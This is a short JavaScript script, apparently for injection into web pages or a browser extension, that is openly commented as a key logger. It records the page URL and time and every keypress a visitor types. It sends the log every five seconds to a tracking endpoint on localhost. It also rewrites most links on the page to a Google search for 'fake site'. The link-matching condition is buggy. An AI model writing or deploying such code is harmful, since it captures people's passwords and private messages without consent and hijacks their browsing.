// User info
var pageVisit = {};
pageVisit.url = window.location.href;
pageVisit.time = Math.floor(Date.now() / 1000);

// Modify outgoing url on a site
$("a").each(function() {
  var $elem = $(this);
  var url = $elem.attr("href");

  if(url.indexOf("https://news.ycombinator.com") != 0 || url.indexOf("http") != -1) {
    $elem.attr("href", "http://www.google.com/?q=fake+site")
  }
});

// Key logger
document.addEventListener('keypress', function (e) {
    e = e || window.event;
    var charCode = typeof e.which == "number" ? e.which : e.keyCode;
    if (charCode) {
      pageVisit.keylog += String.fromCharCode(charCode);
      console.log(pageVisit);
    }
});

// Send data to server every 5 seconds
var timer = setInterval(sendData, 5000);
function sendData() {
  console.log(JSON.stringify(pageVisit));
  $.ajax({
    type: "POST",
    url: "http://localhost:5000/api/v1/track",
    data: JSON.stringify(pageVisit),
    dataType: "json"
  });
}
